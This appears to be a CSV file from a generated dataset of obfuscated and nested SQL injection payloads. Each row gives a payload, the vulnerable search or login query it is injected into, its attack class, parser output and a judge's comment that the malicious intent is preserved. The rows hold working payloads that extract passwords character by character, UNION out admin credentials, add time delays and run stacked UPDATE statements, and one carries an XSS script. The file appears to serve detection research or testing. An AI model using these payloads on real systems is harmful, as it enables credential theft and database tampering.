q00310,%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20EXISTS(SELECT%20*%20FROM%20users%20WHERE%20username=%27admin%27)%2F*%',encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00311,"'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--","SELECT * FROM products WHERE name LIKE '%'%2BCHAR(0x27)%2BAND%20ASCII(SUBSTRING((SELECT%20password%20FROM%20users%20LIMIT%201),%201,%201))%20>%2050--%'",encoding_obfuscation,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00312,%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22,SELECT * FROM products WHERE name LIKE '%%25'%20OR%20WAITFOR%20DELAY%20%270:0:5%27%20AND%20%28%29%22%',encoding_obfuscation,search,1,0,0.0,True,databricks,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""JSONExtract"", ""Mod"", ""JSONPathKey"", ""From"", ""Star"", ""Table"", ""JSONPathRoot"", ""JSONPath"", ""Column""]",True,payload_fragment,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00313,"%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))","SELECT * FROM products WHERE name LIKE '%%25'%20UNION%20SELECT%20NULL,NULL,NULL(CHAR(0x23))%'",encoding_obfuscation,search,1,0,0.0,True,mysql,"[""EQ"", ""Anonymous"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Mod"", ""Chr"", ""From"", ""Join"", ""Table"", ""Star"", ""HexString"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00334,"(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--","SELECT * FROM users WHERE username = '(SELECT IF((ASCII(SUBSTRING(password,1,1))=81),1,2) FROM (SELECT password FROM users WHERE username='{input}') AS a--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,mysql,"[""Struct"", ""EQ"", ""Paren"", ""Select"", ""Identifier"", ""Where"", ""Alias"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00335,"' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%","SELECT * FROM users WHERE username = '' OR EXISTS(SELECT * FROM (SELECT username,password FROM users WHERE username='{input}')) AND '%'='%' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Exists"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00337,"IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--","SELECT * FROM users WHERE username = 'IF(EXISTS(SELECT 1 FROM (SELECT username,password FROM users WHERE username='{input}') AS b),1,2)--' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Exists"", ""Where"", ""Column""]",True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00339,"-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))","SELECT * FROM users WHERE username = '-- (SELECT COUNT(*) FROM users WHERE username LIKE CONCAT('{input}', '%'))' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,[],True,complete_query,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00341,{username}'; EXECUTE FUNCTION get_user_id('{input}')--,SELECT * FROM users WHERE username = '{username}'; EXECUTE FUNCTION get_user_id('{input}')--' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""EQ"", ""Literal"", ""Select"", ""Identifier"", ""Command"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00343,"(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)","SELECT * FROM users WHERE username = '(SELECT 1 FROM (SELECT username FROM users WHERE username='{input}' UNION SELECT username FROM users WHERE username='<script>alert(""XSS"")</script>') AS sub)' AND password = 'anything'",nested_injection,login,1,0,0.0,True,default,"[""TableAlias"", ""Union"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""From"", ""Table"", ""Where"", ""Column""]",True,complete_query,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00344,' OR (SELECT CASE WHEN username=CAST((SELECT 'admin' from users LIMIT 1) AS VARCHAR) THEN 1 ELSE 0 END FROM users WHERE username='{input}'),SELECT * FROM users WHERE username = '' OR (SELECT CASE WHEN username=CAST((SELECT 'admin' from users LIMIT 1) AS VARCHAR) THEN 1 ELSE 0 END FROM users WHERE username='{input}')' AND password = 'anything',nested_injection,login,1,0,0.0,True,default,"[""Case"", ""Or"", ""EQ"", ""If"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Limit"", ""From"", ""Table"", ""Cast"", ""Star"", ""DataType"", ""Column""]",True,payload_fragment,nested_injection,True,True,True,5,malicious intent appears preserved; candidate is plausible for login; mutation is meaningfully different from the seed.
q00346,' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%' OR 1=1) --,SELECT * FROM products WHERE name LIKE '%' AND (SELECT COUNT(*) FROM users WHERE username LIKE '%' OR 1=1) --%',nested_injection,search,1,0,0.0,True,default,"[""And"", ""Or"", ""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Count"", ""From"", ""Like"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,tautology,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00347,'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--,SELECT * FROM products WHERE name LIKE '%'; WAITFOR DELAY '0:0:10' AND (SELECT NULL FROM sysobjects WHERE xtype='U')--%',nested_injection,search,1,0,0.0,False,,[],False,static_only,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00348,') OR 1>1; SELECT * FROM sensitive_data WHERE id = (SELECT 1 FROM information_schema.tables WHERE table_name='users') --,SELECT * FROM products WHERE name LIKE '%') OR 1>1; SELECT * FROM sensitive_data WHERE id = (SELECT 1 FROM information_schema.tables WHERE table_name='users') --%',nested_injection,search,1,0,0.0,True,default,"[""Or"", ""EQ"", ""Paren"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""GT"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00349,'; UPDATE products SET price = 0 WHERE id IN ((SELECT id FROM orders WHERE user_id = 1))--,SELECT * FROM products WHERE name LIKE '%'; UPDATE products SET price = 0 WHERE id IN ((SELECT id FROM orders WHERE user_id = 1))--%',nested_injection,search,1,0,0.0,True,default,"[""EQ"", ""Subquery"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""Update"", ""From"", ""In"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,stacked_queries,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00350,"') UNION SELECT username, password FROM admin_users --","SELECT * FROM products WHERE name LIKE '%') UNION SELECT username, password FROM admin_users --%'",nested_injection,search,1,0,0.0,True,default,"[""Union"", ""EQ"", ""Paren"", ""Literal"", ""Select"", ""Identifier"", ""Where"", ""From"", ""Table"", ""Star"", ""Column""]",True,payload_fragment,blind_boolean,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00352,"; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --","SELECT * FROM products WHERE name LIKE '%; WAITFOR DELAY '0:0:5' AND (SELECT DBMS_PIPE.RECEIVE_MESSAGE(chr(66)||chr(67)||chr(79)||chr(101), 5) FROM DUAL) --%'",nested_injection,search,1,0,0.0,False,,[],False,static_only,blind_time,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
q00353,") OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --","SELECT * FROM products WHERE name LIKE '%) OR (SELECT ASCII(SUBSTRING(password, 1, 1)) FROM users WHERE username = 'admin')) > 64 --%'",nested_injection,search,1,0,0.0,False,,[],False,static_only,comment_obfuscation,True,True,True,5,malicious intent appears preserved; candidate is plausible for search; mutation is meaningfully different from the seed.
